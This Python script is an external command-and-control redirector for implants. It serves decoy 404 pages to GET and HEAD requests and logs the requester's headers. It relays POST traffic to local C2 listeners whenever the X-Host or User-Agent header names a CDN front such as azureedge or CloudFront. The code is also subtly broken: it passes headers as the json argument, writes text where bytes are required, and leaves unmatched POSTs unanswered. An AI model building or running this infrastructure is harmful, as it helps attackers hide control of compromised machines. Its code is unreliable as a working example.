#!/usr/bin/python3

import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LHOST = "0.0.0.0"
LPORT = 443

listener_bucket = {
    "managedservices.azureedge.net": "8000",
    "Amazon CloudFront": "9000",
}

class Stager(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        content = f"{message}"
        return content.encode("utf8")

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("404 Not Found"))
        currtime = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
        print("[" + currtime + "] GET request from " + self.address_string())
        for x, y in self.headers.items():
            print("  - ", x, ": ", y )
        print("------------------------------------------------------------")

    def do_HEAD(self):
        self._set_headers()
        self.wfile.write(self._html("404 Not Found"))
        currtime = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
        print("[" + currtime + "] HEAD request from " + self.address_string())
        for x, y in self.headers.items():
            print("  - ", x, ": ", y )
        print("------------------------------------------------------------")

    def do_POST(self):
        headerValue = ""
        if 'X-Host' in self.headers:
            headerValue = self.headers['X-Host']
        elif 'User-Agent' in self.headers:
            headerValue = self.headers['User-Agent']
        if headerValue in listener_bucket:
            print("Host Header [", headerValue, "] => routing to ", listener_bucket[headerValue])
            postData = ((self.rfile.read(int(self.headers['content-length']))).decode('utf-8'))
            response = requests.post('https://localhost:' + listener_bucket[headerValue] + '/request', postData, self.headers, verify=False)
            self._set_headers()
            self.wfile.write(response.text)

    def log_message(self, format, *args):
        return

def main():
    if (len(sys.argv) < 3):
        print("Usage:", sys.argv[0], "<certfile> <keyfile>")
        return
    currtime = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
    print(f"[+] {currtime} Starting external c2 server on {LHOST}:{LPORT}")
    server = HTTPServer((LHOST, LPORT), Stager)
    server.socket = ssl.wrap_socket(server.socket, certfile=sys.argv[1], keyfile=sys.argv[2], server_side=True)
    thread = threading.Thread(None, server.serve_forever)
    thread.daemon = True
    thread.start()
    thread.join()

if __name__ == "__main__":
    main()